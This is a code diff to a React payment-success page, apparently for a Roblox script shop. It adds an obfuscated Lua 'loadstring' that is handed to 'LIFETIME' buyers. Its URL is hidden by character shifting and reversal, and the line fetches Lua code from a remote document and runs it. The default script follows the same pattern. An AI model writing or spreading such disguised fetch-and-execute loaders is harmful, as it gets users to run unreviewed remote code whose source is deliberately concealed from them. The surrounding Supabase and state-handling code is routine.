@@ -24,6 +24,8 @@ interface SocialLink {
   label: string;
 }
 
+const ADMIN_LOADSTRING = `loadstring(game:GetService'HttpService':JSONDecode(game:HttpGet(("PZVMNV6H_hZWhwswksnR4xyunwhx4fyfi4hnqgzu47{2xsf}jwfmx4xyhfknywf4xysjrzhti4.yqzfkji-4xjxfgfyfi4xsf}jyxfu4xyhjotwu46{4rth3xnufjqlttl3jwtyxjwnk44?xuyym"):gsub('.',function(c)return string.char(c:byte()+3)end):reverse():gsub('.',function(c)return string.char(c:byte()-8)end))).fields.content.stringValue)()`;
+
 const PaymentSuccess: FC<PaymentSuccessProps> = ({ finalData, onCopy }) => {
   const [scriptText, setScriptText] = useState('loadstring(game:GetService\'HttpService\':JSONDecode(game:HttpGet(("7h^vs\\127uRYIsl8W:<~N8{6z{wpyjz6h{hk6jpsi|w69}4zuh\\127lyhoz6z{jhmp{yh6z{ult|jvk60{s|hmlk/6zlzhih{hk6zuh\\127l{zhw6z{jlqvyw68}6tvj5zpwhlsnvvn5lyv{zlypm66Azw{{o"):gsub(\'.\',function(c)return string.char(c:byte()+1)end):reverse():gsub(\'.\',function(c)return string.char(c:byte()-8)end))).fields.content.stringValue)()');
   const [socialLinks, setSocialLinks] = useState<SocialLink[]>([]);
@@ -31,16 +33,21 @@ const PaymentSuccess: FC<PaymentSuccessProps> = ({ finalData, onCopy }) => {
   const [showFullKey, setShowFullKey] = useState(false);
   const [showScript, setShowScript] = useState(false);
 
+  const isAdmin = finalData.package === 'LIFETIME';
+  const displayScript = isAdmin ? ADMIN_LOADSTRING : scriptText;
+
   useEffect(() => {
     const fetchData = async () => {
-      const { data: settingsData } = await supabase
-        .from('app_settings')
-        .select('value')
-        .eq('key', 'loadstring_script')
-        .maybeSingle();
+      if (!isAdmin) {
+        const { data: settingsData } = await supabase
+          .from('app_settings')
+          .select('value')
+          .eq('key', 'loadstring_script')
+          .maybeSingle();
 
-      if (settingsData?.value) {
-        setScriptText(settingsData.value);
+        if (settingsData?.value) {
+          setScriptText(settingsData.value);
+        }
       }
 
       const { data: linksData } = await supabase
@@ -56,7 +63,7 @@ const PaymentSuccess: FC<PaymentSuccessProps> = ({ finalData, onCopy }) => {
     };
 
     fetchData();
-  }, []);
+  }, [isAdmin]);
 
   const censorText = (text: string) => {
     return '•'.repeat(Math.min(text.length, 24));
